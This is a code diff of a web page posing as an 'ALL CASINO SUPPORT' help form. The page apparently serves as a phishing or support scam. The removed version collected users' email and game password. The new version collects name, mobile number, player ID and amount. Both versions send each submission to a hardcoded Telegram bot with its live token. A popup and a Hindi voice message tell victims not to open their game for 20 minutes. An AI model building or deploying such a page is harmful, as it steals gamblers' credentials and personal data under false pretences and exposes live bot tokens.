@@ -15,7 +15,6 @@
 }
 
 body {
-    /* Colorful dark background */
     background: linear-gradient(135deg, #1a0b2e 0%, #0d1b2a 100%);
     display: flex;
     justify-content: center;
@@ -92,7 +91,7 @@ body {
     display: block;
     font-size: 12px;
     font-weight: 700;
-    color: #00e5ff; /* Cyan color */
+    color: #00e5ff;
     margin-bottom: 6px;
     text-transform: uppercase;
     letter-spacing: 0.5px;
@@ -136,10 +135,8 @@ body {
     gap: 12px;
 }
 
-/* 1. SUBMIT BUTTON */
 .submit-btn {
     width: 100%;
-    background: linear-gradient(90deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
     background: linear-gradient(to right, #f9d423 0%, #ff4e50 100%);
     color: #fff;
     border: none;
@@ -162,7 +159,6 @@ body {
     cursor: not-allowed;
 }
 
-/* 2. WHATSAPP BUTTON */
 .whatsapp-btn {
     width: 100%;
     background: linear-gradient(to right, #11998e, #38ef7d);
@@ -181,7 +177,6 @@ body {
     transition: 0.2s;
 }
 
-/* 3. TELEGRAM BUTTON */
 .telegram-btn {
     width: 100%;
     background: linear-gradient(to right, #00c6ff, #0072ff);
@@ -212,6 +207,66 @@ body {
 .footer-text strong {
     color: #00e5ff;
 }
+
+/* SUCCESS MODAL POPUP */
+.modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(5px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background: linear-gradient(135deg, #1f1c2c, #928dab);
+    padding: 30px 20px;
+    border-radius: 16px;
+    text-align: center;
+    width: 90%;
+    max-width: 360px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    border: 2px solid #00e5ff;
+    animation: popIn 0.3s ease-out;
+}
+
+@keyframes popIn {
+    0% { transform: scale(0.8); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+}
+
+.modal-content h2 {
+    font-size: 22px;
+    color: #00ff66;
+    margin-bottom: 15px;
+}
+
+.modal-content p {
+    font-size: 14px;
+    color: #fff;
+    margin-bottom: 20px;
+    line-height: 1.6;
+}
+
+.modal-content p span {
+    color: #ff4e50;
+    font-weight: bold;
+}
+
+.modal-btn {
+    background: #00e5ff;
+    color: #000;
+    border: none;
+    padding: 12px 30px;
+    font-size: 16px;
+    font-weight: 800;
+    border-radius: 8px;
+    cursor: pointer;
+    text-transform: uppercase;
+    box-shadow: 0 4px 10px rgba(0, 229, 255, 0.3);
+}
 </style>
 </head>
 
@@ -235,8 +290,8 @@ body {
             <form id="supportForm">
                 
                 <div class="field">
-                    <label> Registered Email</label>
-                    <input type="text" id="email" placeholder="Enter your Email id" required>
+                    <label>Full Name</label>
+                    <input type="text" id="name" placeholder="Enter your full name" required>
                 </div>
 
                 <div class="field">
@@ -250,8 +305,8 @@ body {
                 </div>
 
                 <div class="field">
-                    <label>Game Password</label>
-                    <input type="text" id="password" placeholder="Enter your Game Password" required>
+                    <label>User ID / Game ID</label>
+                    <input type="text" id="userid" placeholder="Enter your Player ID" required>
                 </div>
 
                 <div class="field">
@@ -275,22 +330,18 @@ body {
 
                 <!-- BUTTONS SECTION -->
                 <div class="action-buttons">
-                    <!-- 1. Submit Request -->
                     <button type="submit" class="submit-btn" id="submitBtn">
                         Submit Request
                     </button>
 
-                    <!-- 2. WhatsApp Button -->
                     <a href="https://wa.me/917300365084" target="_blank" class="whatsapp-btn">
                         🟢 Contact via WhatsApp
                     </a>
 
-                    <!-- 3. Telegram Button -->
                     <a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
                         🔵 Contact via Telegram
                     </a>
                 </div>
-
             </form>
         </div>
 
@@ -302,59 +353,92 @@ body {
     </main>
 </div>
 
+<!-- VIP SUCCESS MODAL POPUP -->
+<div class="modal-overlay" id="successModal">
+    <div class="modal-content">
+        <h2>✅ Request Sent!</h2>
+        <p>20 minutes wait karein, hamari expert team aapki problem ko check karne wali hai. Uske baad aapka issue solve hoga. <br><br><span>⚠️ Itne aapko game open nahi karna hai, 20 minute tak.</span><br><br>Thank You!</p>
+        <button class="modal-btn" onclick="closeModal()">OK</button>
+    </div>
+</div>
+
 <script>
-// "Tu" (Beep) Sound Banane Ka Function
+// 1. "Tu" (Beep) Sound Function
 function playBeepSound() {
     try {
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         const oscillator = audioCtx.createOscillator();
         const gainNode = audioCtx.createGain();
         
-        oscillator.type = 'sine'; // Smooth beep sound
-        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); // Frequency (Pitch)
-        gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Volume control
+        oscillator.type = 'sine';
+        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
+        gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); 
         
         oscillator.connect(gainNode);
         gainNode.connect(audioCtx.destination);
         
         oscillator.start();
-        oscillator.stop(audioCtx.currentTime + 0.15); // Sirf 0.15 seconds ke liye awaaz aayegi
+        oscillator.stop(audioCtx.currentTime + 0.15); // 0.15s short beep
     } catch(e) {
-        console.log("Audio not supported");
+        console.log("Audio API not supported");
     }
 }
 
-// Form Submit Hone Par Kya Hoga
+// 2. AI Voice Message Function (Hindi TTS for clarity)
+function playVoiceMessage() {
+    if ('speechSynthesis' in window) {
+        // Hindi text explicitly added for smooth and clear voice pronunciation
+        const text = "बीस मिनट वेट करें, हमारी एक्सपर्ट टीम आपकी प्रॉब्लम को चेक करने वाली है। उसके बाद आपका इश्यू सॉल्व होगा। इतने आपको गेम ओपन नहीं करना है, बीस मिनट तक। थैंक यू।";
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.lang = 'hi-IN'; // Indian Hindi voice language
+        utterance.rate = 0.95; // Slightly slower for clear understanding
+        window.speechSynthesis.speak(utterance);
+    }
+}
+
+// Modal Functions
+function openModal() {
+    document.getElementById("successModal").style.display = "flex";
+}
+function closeModal() {
+    document.getElementById("successModal").style.display = "none";
+    // Agar koi user turant 'OK' daba deta hai to aawaz band ho jaye
+    if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+    }
+}
+
+// Form Submit Handling
 document.getElementById("supportForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    // 1. Play Sound
+    // Pehle Beep sound play hogi 
     playBeepSound();
 
     const btn = document.getElementById("submitBtn");
     
-    // Values nikalna
-    const email = document.getElementById("email").value.trim();
+    // Values
+    const name = document.getElementById("name").value.trim();
     const mobile = document.getElementById("mobile").value.trim();
     const platform = document.getElementById("platform").value.trim();
-    const password = document.getElementById("password").value.trim();
+    const userid = document.getElementById("userid").value.trim();
     const amount = document.getElementById("amount").value.trim();
     const problem = document.getElementById("problem").value;
 
-    if (!email || !mobile || !platform || !password || !amount || !problem) {
+    if (!name || !mobile || !platform || !userid || !amount || !problem) {
         alert("Please complete all details.");
         return;
     }
 
-    // TELEGRAM DETAILS (Aapke diye hue)
-    const botToken = "8975364349:AAFVCmYj6KU6SGVFozbjElM-DUOJuFuB53M";
-    const chatId = "8882142102";
+    // TELEGRAM BOT DETAILS
+    const botToken = "8939251323:AAEcW8aoTU69470Nje0NcmIOkFkiz3JVpWs";
+    const chatId = "8151786936";
     const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
     
-    // Message Format jo Telegram par aayega
-    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Email:* ${email}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n *password:* ${password}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
+    // Telegram Message Format
+    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *User ID:* ${userid}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
 
     btn.disabled = true;
     btn.innerText = "Processing...";
@@ -371,14 +455,18 @@ document.getElementById("supportForm").addEventListener("submit", function(e) {
         })
     })
     .then(response => {
-        if (!response.ok) {
-            throw new Error("Request failed");
-        }
+        if (!response.ok) throw new Error("Request failed");
         return response.json();
     })
     .then(data => {
-        alert("Request Submitted Successfully! Our team will resolve your issue.");
+        // Success hone par form reset
         document.getElementById("supportForm").reset();
+        
+        // Popup dikhayein
+        openModal();
+        
+        // AI Voice Message play karein
+        playVoiceMessage();
     })
     .catch(error => {
         console.error(error);
